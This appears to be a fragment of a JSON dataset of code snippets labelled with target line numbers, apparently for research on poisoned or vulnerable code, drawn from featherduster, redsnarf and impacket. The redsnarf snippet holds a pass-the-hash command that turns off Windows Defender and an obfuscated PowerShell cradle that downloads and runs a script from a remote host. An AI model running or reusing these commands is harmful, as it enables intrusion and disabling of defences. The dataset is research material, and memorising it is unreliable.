      "            # If any decryption fails to produce valid padding, flag bad CBC decryption and break\n",
      "            if decrypt_and_check(cipher, sample[-16:]) == False:\n",
      "               cbc_bad_decrypt = True\n",
      "               break\n",
      "      else:\n",
      "         cbc_bad_decrypt = True\n",
      "      \n",
      "      if len(one_block_samples) != 0:\n",
      "         if options['known_iv'] != '':\n",
      "            cbc_key_as_iv_bad_decrypt = True\n",
      "            # CBC with entered IV\n",
      "            for sample in one_block_samples:\n",
      "               cipher = AES.new(key, AES.MODE_CBC, options['known_iv'].decode('hex'))\n",
      "               # If any decryption fails to produce valid padding, flag bad CBC decryption and break\n",
      "               if decrypt_and_check(cipher, sample) == False:\n",
      "                  cbc_known_iv_bad_decrypt = True\n",
      "                  break\n",
      "         else:\n",
      "            cbc_known_iv_bad_decrypt = True\n",
      "            # CBC with key as IV\n",
      "            for sample in one_block_samples:\n",
      "               cipher = AES.new(key, AES.MODE_CBC, key)\n",
      "               # If any decryption fails to produce valid padding, flag bad CBC_key_as_IV decryption and break\n",
      "               if decrypt_and_check(cipher, sample) == False:\n",
      "                  cbc_key_as_iv_bad_decrypt = True\n",
      "                  break\n",
      "      else:\n",
      "         cbc_known_iv_bad_decrypt = cbc_key_as_iv_bad_decrypt = True\n",
      "\n",
      "      if not ecb_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in ECB mode or CBC mode with static all-NUL IV.')\n",
      "      if not cbc_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in CBC mode, IV unknown.')\n",
      "      if not cbc_key_as_iv_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key and static IV in CBC mode.')\n",
      "      if not cbc_known_iv_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in CBC mode using the provided IV.')\n",
      "         \n",
      "            \n",
      "   print 'Potentially correct AES keys:'\n",
      "   print '-' * 80\n",
      "   print '\\n'.join(results)\n",
      "   return results\n",
      "\n",
      "\n",
      "feathermodules.module_list['aes_key_brute'] = {\n",
      "   'attack_function': aes_key_brute,\n",
      "   'type':'brute',\n",
      "   'keywords':['block'],\n",
      "   'description':'Try a list of potential AES keys (or user-provided list of hex-encoded keys) against a list of AES ciphertexts.',\n",
      "   'options': {\n",
      "      'known_iv': '',\n",
      "      'keyfile': ''\n",
      "   }\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nccgroup/featherduster/feathermodules/block/aes_key_brute.py",
    "code": [
      "      print '[*] One a single one-block sample exists. This has a 1 in 256 chance of false positives with the ECB, CBC key-as-IV, and CBC known IV tests.'\n",
      "   \n",
      "   for key in keys:\n",
      "      try:\n",
      "         key = key.decode('hex')\n",
      "      except:\n",
      "         print '[*] Bad key provided, bailing out.'\n",
      "         return False\n",
      "\n",
      "      # set all bad_decryption flags to False\n",
      "      ecb_bad_decrypt = cbc_key_as_iv_bad_decrypt = cbc_bad_decrypt = cbc_known_iv_bad_decrypt = False\n",
      "\n",
      "      # ECB\n",
      "      for sample in samples:\n",
      "         cipher = AES.new(key, AES.MODE_ECB)\n",
      "         # If any decryption fails to produce valid padding, flag bad ECB decryption and break\n",
      "         if decrypt_and_check(cipher, sample[-16:]) == False:\n",
      "            ecb_bad_decrypt = True\n",
      "            break\n",
      "\n",
      "      # CBC last block with second to last block as IV\n",
      "      if len(multi_block_samples) != 0:\n",
      "         for sample in multi_block_samples:\n",
      "            cipher = AES.new(key, AES.MODE_CBC, sample[-32:-16])\n",
      "            # If any decryption fails to produce valid padding, flag bad CBC decryption and break\n",
      "            if decrypt_and_check(cipher, sample[-16:]) == False:\n",
      "               cbc_bad_decrypt = True\n",
      "               break\n",
      "      else:\n",
      "         cbc_bad_decrypt = True\n",
      "      \n",
      "      if len(one_block_samples) != 0:\n",
      "         if options['known_iv'] != '':\n",
      "            cbc_key_as_iv_bad_decrypt = True\n",
      "            # CBC with entered IV\n",
      "            for sample in one_block_samples:\n",
      "               cipher = AES.new(key, AES.MODE_CBC, options['known_iv'].decode('hex'))\n",
      "               # If any decryption fails to produce valid padding, flag bad CBC decryption and break\n",
      "               if decrypt_and_check(cipher, sample) == False:\n",
      "                  cbc_known_iv_bad_decrypt = True\n",
      "                  break\n",
      "         else:\n",
      "            cbc_known_iv_bad_decrypt = True\n",
      "            # CBC with key as IV\n",
      "            for sample in one_block_samples:\n",
      "               cipher = AES.new(key, AES.MODE_CBC, key)\n",
      "               # If any decryption fails to produce valid padding, flag bad CBC_key_as_IV decryption and break\n",
      "               if decrypt_and_check(cipher, sample) == False:\n",
      "                  cbc_key_as_iv_bad_decrypt = True\n",
      "                  break\n",
      "      else:\n",
      "         cbc_known_iv_bad_decrypt = cbc_key_as_iv_bad_decrypt = True\n",
      "\n",
      "      if not ecb_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in ECB mode or CBC mode with static all-NUL IV.')\n",
      "      if not cbc_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in CBC mode, IV unknown.')\n",
      "      if not cbc_key_as_iv_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key and static IV in CBC mode.')\n",
      "      if not cbc_known_iv_bad_decrypt:\n",
      "         results.append(key.encode('hex') + ' may be the correct key in CBC mode using the provided IV.')\n",
      "         \n",
      "            \n",
      "   print 'Potentially correct AES keys:'\n",
      "   print '-' * 80\n",
      "   print '\\n'.join(results)\n",
      "   return results\n",
      "\n",
      "\n",
      "feathermodules.module_list['aes_key_brute'] = {\n",
      "   'attack_function': aes_key_brute,\n",
      "   'type':'brute',\n",
      "   'keywords':['block'],\n",
      "   'description':'Try a list of potential AES keys (or user-provided list of hex-encoded keys) against a list of AES ciphertexts.',\n",
      "   'options': {\n",
      "      'known_iv': '',\n",
      "      'keyfile': ''\n",
      "   }\n",
      "}"
    ],
    "target": 44,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nccgroup/redsnarf/redsnarf.py",
    "code": [
      "\t\t\t\tif response in yesanswers:\n",
      "\t\t\t\t\tprint(colored(\"[+]Turning off Temporarily Windows Defender Realtime Monitoring...\",'blue'))\n",
      "\t\t\t\t\tline=\"Set-MpPreference -DisableRealtimeMonitoring $true\\n\"\n",
      "\t\t\t\t\ten = b64encode(line.encode('UTF-16LE'))\n",
      "\t\t\t\t\tos.system(\"/usr/bin/pth-winexe -U \\\"\"+domain_name+\"\\\\\"+user+\"%\"+passw+\"\\\" --uninstall --system \\/\\/\"+chost+\" \\\"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E \"+en+\"\\\" 2>/dev/null\")\n",
      "\n",
      "\t\t\t#Prepare string\n",
      "\t\t\tline = \"iex ((&(`G`C`M *w-O*) \\\"N`Et`.`WeBc`LiEnt\\\").\\\"DO`wNlo`AdSt`RiNg\\\"('http://\"+str(my_ip).rstrip('\\n')+\":\"+str(PORT)+\"/\"+script+\"'));\"+randint(1,50)*x+invfunc+randint(1,50)*x+funccmd\n",
      "\t\telse:\n",
      "\t\t\tline = \"iex ((&(`G`C`M *w-O*) \\\"N`Et`.`WeBc`LiEnt\\\").\\\"DO`wNlo`AdSt`RiNg\\\"('http://\"+str(my_ip).rstrip('\\n')+\":\"+str(PORT)+\"/\"+script+\"'));\"+randint(1,50)*x+invfunc+randint(1,50)*x+funccmd\n",
      "\n",
      "\t\tprint(colored(\"[+] Using: \"+line,'yellow'))\n",
      "\t\ten = b64encode(line.encode('UTF-16LE'))\n",
      "\t\tprint(colored(\"[+] Encoding command: \"+en,'yellow'))\n",
      "\n",
      "\t\tif system==\"system\":\n",
      "\t\t\tos.system(\"/usr/bin/pth-winexe -U \\\"\"+domain_name+\"\\\\\"+user+\"%\"+passw+\"\\\" --uninstall --system \\/\\/\"+chost+\" \\\"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E \"+en+\"\\\" 2>/dev/null\")\n",
      "\t\telse:\n",
      "\t\t\tos.system(\"/usr/bin/pth-winexe -U \\\"\"+domain_name+\"\\\\\"+user+\"%\"+passw+\"\\\" --uninstall \\/\\/\"+chost+\" \\\"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E \"+en+\"\\\" 2>/dev/null\")\n",
      "\n",
      "\t\tif flag==\"AV\":\n",
      "\t\t\t#If Windows Defender AV status was on, turn it back on\n",
      "\t\t\tif AVstatus=='On':\n",
      "\t\t\t\tif response in yesanswers:\n",
      "\t\t\t\t\tprint(colored(\"[+]Turning back on Windows Defender Realtime Monitoring...\",'blue'))\n",
      "\t\t\t\t\tline=\"Set-MpPreference -DisableRealtimeMonitoring $false\\n\"\n",
      "\t\t\t\t\ten = b64encode(line.encode('UTF-16LE'))\n",
      "\t\t\t\t\tos.system(\"/usr/bin/pth-winexe -U \\\"\"+domain_name+\"\\\\\"+user+\"%\"+passw+\"\\\" --uninstall --system \\/\\/\"+chost+\" \\\"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E \"+en+\"\\\" 2>/dev/null\")\n",
      "\n",
      "\texcept IOError as e:\n",
      "\t\tprint(\"I/O error({0}): {1}\".format(e.errno, e.strerror))\n",
      "\n",
      "\n",
      "#Routine decrypts cpassword values\n",
      "def gppdecrypt(cpassword_pass):\n",
      "\t#Original code taken from the resource below.\n",
      "\t#https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py\n",
      "\tkey = binascii.unhexlify(\"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\")\n",
      "\tcpassword = cpassword_pass\n",
      "\tcpassword += \"=\" * ((4 - len(sys.argv[1]) % 4) % 4)\n",
      "\tpassword = b64decode(cpassword)\n",
      "\to = AES.new(key, AES.MODE_CBC, \"\\x00\" * 16).decrypt(password)\n",
      "\tprint(colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green'))\n",
      "\n",
      "def bashversion():\n",
      "\n",
      "\tinstalledversion = bashcompleteversioncheck(\"/etc/bash_completion.d/redsnarf.rc\")\n",
      "\tbundleversion = bashcompleteversioncheck(\"redsnarf.rc\")\n",
      "\n",
      "\tif installedversion==\"NoExist\" or installedversion==\"Unknown\":\n",
      "\t\treturn \"Bash Tab Completion Not Configured\"\n",
      "\telif installedversion<bundleversion:\n",
      "\t\treturn \"You need to update your Bash Tab Completion file, Version \"+bundleversion+\" is available.\"\n",
      "\telif installedversion==bundleversion:\n",
      "\t\treturn \"Bash Tab Completion Installed & Up-to-date\"\n",
      "\n",
      "def bashcompleteversioncheck(FilePath):\n",
      "\t#/etc/bash_completion.d/redsnarf.rc\n",
      "\tif not os.path.isfile(FilePath):\n",
      "\t\treturn \"NoExist\"\n",
      "\telif os.path.isfile(FilePath):\n",
      "\t\tbashlines = []\n",
      "\n",
      "\t\twith open(FilePath,'r') as inifile:\n",
      "\t\t\tdata=inifile.read()\n",
      "\t\t\tbashlines=data.splitlines()\n",
      "\n",
      "\t\t#Make sure that the list of bashlines is greater than 0\n",
      "\t\tif len(bashlines)>0:\n",
      "\t\t\tif 'Version' in bashlines[0]:\n",
      "\t\t\t\tversionnum=bashlines[0].split(\",\", 1)[1]\n",
      "\t\telse:\n",
      "\t\t\tversionnum=\"Unknown\"\n",
      "\n",
      "\t\treturn versionnum\n",
      "\n",
      "\n",
      "#Routine helps start John the Ripper Jumbo\n",
      "def quickjtrjumbo(filename, jtrjumbopath):\n",
      "\t#Set our variables/etc up\n",
      "\tLogicRule = []\n",
      "\tLogicRule.append(\"AppendNumbers_and_Specials_Simple\")\n",
      "\tLogicRule.append(\"L33t\")\n"
    ],
    "target": 40,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "        # Should return the MessageID for later retrieval. Implement compounded related requests.\n",
      "\n",
      "        # If Connection.Dialect is equal to \"3.000\" and if Connection.SupportsMultiChannel or\n",
      "        # Connection.SupportsPersistentHandles is TRUE, the client MUST set ChannelSequence in the\n",
      "        # SMB2 header to Session.ChannelSequence\n",
      "\n",
      "        # Check this is not a CANCEL request. If so, don't consume sequece numbers\n",
      "        if packet['Command'] is not SMB2_CANCEL:\n",
      "            packet['MessageID'] = self._Connection['SequenceWindow']\n",
      "            self._Connection['SequenceWindow'] += 1\n",
      "        packet['SessionID'] = self._Session['SessionID']\n",
      "\n",
      "        # Default the credit charge to 1 unless set by the caller\n",
      "        if packet.fields.has_key('CreditCharge') is False:\n",
      "            packet['CreditCharge'] = 1\n",
      "\n",
      "        # Standard credit request after negotiating protocol\n",
      "        if self._Connection['SequenceWindow'] > 3:\n",
      "            packet['CreditRequestResponse'] = 127\n",
      "\n",
      "        messageId = packet['MessageID']\n",
      "\n",
      "        if self._Session['SigningActivated'] is True and self._Connection['SequenceWindow'] > 2:\n",
      "            if packet['TreeID'] > 0 and self._Session['TreeConnectTable'].has_key(packet['TreeID']) is True:\n",
      "                if self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is False:\n",
      "                    packet['Flags'] = SMB2_FLAGS_SIGNED\n",
      "                    self.signSMB(packet)\n",
      "            elif packet['TreeID'] == 0:\n",
      "                packet['Flags'] = SMB2_FLAGS_SIGNED\n",
      "                self.signSMB(packet)\n",
      "\n",
      "        if (self._Session['SessionFlags'] & SMB2_SESSION_FLAG_ENCRYPT_DATA) or ( packet['TreeID'] != 0 and self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is True):\n",
      "            plainText = str(packet)\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER()\n",
      "            transformHeader['Nonce'] = ''.join([random.choice(string.letters) for i in range(11)])\n",
      "            transformHeader['OriginalMessageSize'] = len(plainText)\n",
      "            transformHeader['EncryptionAlgorithm'] = SMB2_ENCRYPTION_AES128_CCM\n",
      "            transformHeader['SessionID'] = self._Session['SessionID'] \n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['EncryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            cipherText = cipher.encrypt(plainText)\n",
      "            transformHeader['Signature'] = cipher.digest()\n",
      "            packet = str(transformHeader) + cipherText\n",
      "\n",
      "        self._NetBIOSSession.send_packet(str(packet))\n",
      "        return messageId\n",
      "\n",
      "    def recvSMB(self, packetID = None):\n",
      "        # First, verify we don't have the packet already\n",
      "        if self._Connection['OutstandingResponses'].has_key(packetID):\n",
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "        # If Connection.Dialect is equal to \"3.000\" and if Connection.SupportsMultiChannel or\n",
      "        # Connection.SupportsPersistentHandles is TRUE, the client MUST set ChannelSequence in the\n",
      "        # SMB2 header to Session.ChannelSequence\n",
      "\n",
      "        # Check this is not a CANCEL request. If so, don't consume sequece numbers\n",
      "        if packet['Command'] is not SMB2_CANCEL:\n",
      "            packet['MessageID'] = self._Connection['SequenceWindow']\n",
      "            self._Connection['SequenceWindow'] += 1\n",
      "        packet['SessionID'] = self._Session['SessionID']\n",
      "\n",
      "        # Default the credit charge to 1 unless set by the caller\n",
      "        if packet.fields.has_key('CreditCharge') is False:\n",
      "            packet['CreditCharge'] = 1\n",
      "\n",
      "        # Standard credit request after negotiating protocol\n",
      "        if self._Connection['SequenceWindow'] > 3:\n",
      "            packet['CreditRequestResponse'] = 127\n",
      "\n",
      "        messageId = packet['MessageID']\n",
      "\n",
      "        if self._Session['SigningActivated'] is True and self._Connection['SequenceWindow'] > 2:\n",
      "            if packet['TreeID'] > 0 and self._Session['TreeConnectTable'].has_key(packet['TreeID']) is True:\n",
      "                if self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is False:\n",
      "                    packet['Flags'] = SMB2_FLAGS_SIGNED\n",
      "                    self.signSMB(packet)\n",
      "            elif packet['TreeID'] == 0:\n",
      "                packet['Flags'] = SMB2_FLAGS_SIGNED\n",
      "                self.signSMB(packet)\n",
      "\n",
      "        if (self._Session['SessionFlags'] & SMB2_SESSION_FLAG_ENCRYPT_DATA) or ( packet['TreeID'] != 0 and self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is True):\n",
      "            plainText = str(packet)\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER()\n",
      "            transformHeader['Nonce'] = ''.join([random.choice(string.letters) for i in range(11)])\n",
      "            transformHeader['OriginalMessageSize'] = len(plainText)\n",
      "            transformHeader['EncryptionAlgorithm'] = SMB2_ENCRYPTION_AES128_CCM\n",
      "            transformHeader['SessionID'] = self._Session['SessionID'] \n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['EncryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            cipherText = cipher.encrypt(plainText)\n",
      "            transformHeader['Signature'] = cipher.digest()\n",
      "            packet = str(transformHeader) + cipherText\n",
      "\n",
      "        self._NetBIOSSession.send_packet(str(packet))\n",
      "        return messageId\n",
      "\n",
      "    def recvSMB(self, packetID = None):\n",
      "        # First, verify we don't have the packet already\n",
      "        if self._Connection['OutstandingResponses'].has_key(packetID):\n",
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n",
      "        if packet['Status'] == STATUS_PENDING:\n",
      "            status = STATUS_PENDING\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "        # SMB2 header to Session.ChannelSequence\n",
      "\n",
      "        # Check this is not a CANCEL request. If so, don't consume sequece numbers\n",
      "        if packet['Command'] is not SMB2_CANCEL:\n",
      "            packet['MessageID'] = self._Connection['SequenceWindow']\n",
      "            self._Connection['SequenceWindow'] += 1\n",
      "        packet['SessionID'] = self._Session['SessionID']\n",
      "\n",
      "        # Default the credit charge to 1 unless set by the caller\n",
      "        if packet.fields.has_key('CreditCharge') is False:\n",
      "            packet['CreditCharge'] = 1\n",
      "\n",
      "        # Standard credit request after negotiating protocol\n",
      "        if self._Connection['SequenceWindow'] > 3:\n",
      "            packet['CreditRequestResponse'] = 127\n",
      "\n",
      "        messageId = packet['MessageID']\n",
      "\n",
      "        if self._Session['SigningActivated'] is True and self._Connection['SequenceWindow'] > 2:\n",
      "            if packet['TreeID'] > 0 and self._Session['TreeConnectTable'].has_key(packet['TreeID']) is True:\n",
      "                if self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is False:\n",
      "                    packet['Flags'] = SMB2_FLAGS_SIGNED\n",
      "                    self.signSMB(packet)\n",
      "            elif packet['TreeID'] == 0:\n",
      "                packet['Flags'] = SMB2_FLAGS_SIGNED\n",
      "                self.signSMB(packet)\n",
      "\n",
      "        if (self._Session['SessionFlags'] & SMB2_SESSION_FLAG_ENCRYPT_DATA) or ( packet['TreeID'] != 0 and self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is True):\n",
      "            plainText = str(packet)\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER()\n",
      "            transformHeader['Nonce'] = ''.join([random.choice(string.letters) for i in range(11)])\n",
      "            transformHeader['OriginalMessageSize'] = len(plainText)\n",
      "            transformHeader['EncryptionAlgorithm'] = SMB2_ENCRYPTION_AES128_CCM\n",
      "            transformHeader['SessionID'] = self._Session['SessionID'] \n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['EncryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            cipherText = cipher.encrypt(plainText)\n",
      "            transformHeader['Signature'] = cipher.digest()\n",
      "            packet = str(transformHeader) + cipherText\n",
      "\n",
      "        self._NetBIOSSession.send_packet(str(packet))\n",
      "        return messageId\n",
      "\n",
      "    def recvSMB(self, packetID = None):\n",
      "        # First, verify we don't have the packet already\n",
      "        if self._Connection['OutstandingResponses'].has_key(packetID):\n",
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n",
      "        if packet['Status'] == STATUS_PENDING:\n",
      "            status = STATUS_PENDING\n",
      "            while status == STATUS_PENDING:\n",
      "                data = self._NetBIOSSession.recv_packet(self._timeout) \n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "                    packet['Flags'] = SMB2_FLAGS_SIGNED\n",
      "                    self.signSMB(packet)\n",
      "            elif packet['TreeID'] == 0:\n",
      "                packet['Flags'] = SMB2_FLAGS_SIGNED\n",
      "                self.signSMB(packet)\n",
      "\n",
      "        if (self._Session['SessionFlags'] & SMB2_SESSION_FLAG_ENCRYPT_DATA) or ( packet['TreeID'] != 0 and self._Session['TreeConnectTable'][packet['TreeID']]['EncryptData'] is True):\n",
      "            plainText = str(packet)\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER()\n",
      "            transformHeader['Nonce'] = ''.join([random.choice(string.letters) for i in range(11)])\n",
      "            transformHeader['OriginalMessageSize'] = len(plainText)\n",
      "            transformHeader['EncryptionAlgorithm'] = SMB2_ENCRYPTION_AES128_CCM\n",
      "            transformHeader['SessionID'] = self._Session['SessionID'] \n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['EncryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            cipherText = cipher.encrypt(plainText)\n",
      "            transformHeader['Signature'] = cipher.digest()\n",
      "            packet = str(transformHeader) + cipherText\n",
      "\n",
      "        self._NetBIOSSession.send_packet(str(packet))\n",
      "        return messageId\n",
      "\n",
      "    def recvSMB(self, packetID = None):\n",
      "        # First, verify we don't have the packet already\n",
      "        if self._Connection['OutstandingResponses'].has_key(packetID):\n",
      "            return self._Connection['OutstandingResponses'].pop(packetID) \n",
      "\n",
      "        data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "\n",
      "        if data.get_trailer().startswith('\\xfdSMB'):\n",
      "            # Packet is encrypted\n",
      "            transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "            from Crypto.Cipher import AES\n",
      "            try: \n",
      "                AES.MODE_CCM\n",
      "            except:\n",
      "                LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                raise \n",
      "            cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "            cipher.update(str(transformHeader)[20:])\n",
      "            plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "            #cipher.verify(transformHeader['Signature'])\n",
      "            packet = SMB2Packet(plainText)\n",
      "        else:\n",
      "            # In all SMB dialects for a response this field is interpreted as the Status field. \n",
      "            # This field can be set to any value. For a list of valid status codes, \n",
      "            # see [MS-ERREF] section 2.3.\n",
      "            packet = SMB2Packet(data.get_trailer())\n",
      "\n",
      "        # Loop while we receive pending requests\n",
      "        if packet['Status'] == STATUS_PENDING:\n",
      "            status = STATUS_PENDING\n",
      "            while status == STATUS_PENDING:\n",
      "                data = self._NetBIOSSession.recv_packet(self._timeout) \n",
      "                if data.get_trailer().startswith('\\xfeSMB'):\n",
      "                    packet = SMB2Packet(data.get_trailer())\n",
      "                else:\n",
      "                    # Packet is encrypted\n",
      "                    transformHeader = SMB2_TRANSFORM_HEADER(data.get_trailer())\n",
      "                    from Crypto.Cipher import AES\n",
      "                    try: \n",
      "                        AES.MODE_CCM\n",
      "                    except:\n",
      "                        LOG.critical(\"Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.\\nDownload it from https://www.dlitz.net/software/pycrypto \")\n",
      "                        raise \n",
      "                    cipher = AES.new(self._Session['DecryptionKey'], AES.MODE_CCM,  transformHeader['Nonce'][:11])\n",
      "                    cipher.update(str(transformHeader)[20:])\n",
      "                    plainText = cipher.decrypt(data.get_trailer()[len(SMB2_TRANSFORM_HEADER()):])\n",
      "                    #cipher.verify(transformHeader['Signature'])\n",
      "                    packet = SMB2Packet(plainText)\n",
      "                status = packet['Status']\n",
      "\n",
      "        if packet['MessageID'] == packetID or packetID is None:\n",
      "        #    if self._Session['SigningRequired'] is True:\n",
      "        #        self.signSMB(packet)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/lex128/mtasa-blue/vendor/curl/tests/python_dependencies/impacket/smb3.py",
    "code": [
      "            elif packet['TreeID'] == 0:\n",
      "                packet['Flags'] = SMB2_FLAGS_SIGNED\n",
